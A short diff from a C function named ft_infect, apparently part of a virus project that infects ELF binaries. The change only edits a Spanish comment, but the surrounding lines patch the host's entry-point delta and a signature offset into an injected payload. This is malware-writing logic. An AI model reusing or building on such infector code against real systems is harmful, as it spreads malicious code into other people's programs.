@@ -162,7 +162,7 @@ void    ft_infect(t_war *war)
     uint64_t entry_delta = war->header->e_entry - new_vaddr;
     memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
 
-    // 6b. NUEVO: parchear el offset de la firma en el payload (sig_offset, offset 10)
+    // 6b. parchear el offset de la firma en el payload (sig_offset, offset 10)
     uint64_t sig_off = aligned_insertion + src_payload_bin_len;   // ← aligned_insertion, no insertion_point
     memcpy(payload + 10, &sig_off, sizeof(uint64_t));
     
